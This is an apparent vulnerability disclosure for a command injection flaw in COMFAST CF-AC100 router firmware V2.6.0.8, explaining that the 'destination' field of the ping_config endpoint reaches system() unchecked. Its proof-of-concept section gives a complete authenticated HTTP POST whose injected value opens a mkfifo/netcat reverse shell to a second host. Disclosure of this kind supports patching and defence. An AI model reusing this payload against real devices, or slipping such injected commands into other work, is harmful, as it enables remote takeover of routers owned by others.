## Comfast CF-AC100

- **Supplier:** COMFAST

- **Product:** CF-AC100

- **Firmware Version:** V2.6.0.8

- **Vulnerability:** Command Injection

### Overview

A command injection vulnerability has been discovered in COMFAST CF-AC100 V2.6.0.8. Attackers can exploit this vulnerability to execute arbitrary commands by sending malicious HTTP POST packets. The vulnerability is triggered when the request path is `/cgi-bin/mbox-config?method=SET&section=ping_config`, requiring the user to log in and obtain cookies.

### Vulnerability Details

![](../main/images/2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)

The trigger point is located in the `sub_44AC14` method of the `webmggnt` component. Here, the `destination` field is not validated and is concatenated using `sprintf`, and then executed using `system`.

![](../main/images/2026-02-23-17-16-38-1430800a-32fc-4edd-b4c6-1290797305fc.png)

### 概念验证

```http
POST /cgi-bin/mbox-config?method=SET&section=ping_config HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: appliation/json
X-Requested-With: XMLHttpRequest
Content-Length: 112
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/index.html
Cookie: language=sc; COMFAST_SESSIONID=0200a8c0-4261ffffffc85cffffff8a5f-6b8b4567

{"destination": "127.0.0.1\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #"}
```

![](../main/images/2026-02-23-17-18-34-image.png)

